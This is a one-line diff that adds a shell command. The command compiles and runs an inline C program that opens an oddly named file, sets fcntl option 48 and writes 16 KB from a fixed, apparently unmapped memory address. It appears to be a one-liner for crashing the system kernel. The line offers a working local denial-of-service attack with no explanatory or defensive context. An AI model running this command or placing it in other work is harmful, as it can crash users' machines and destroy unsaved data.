@@ -1,0 +1,1 @@
+cc -Wno-all -xc -<<<‘main(f){fcntl(f=open(&f,513),48,1);write(f,0xFFFFFC000,1<<14);}’;./a.out
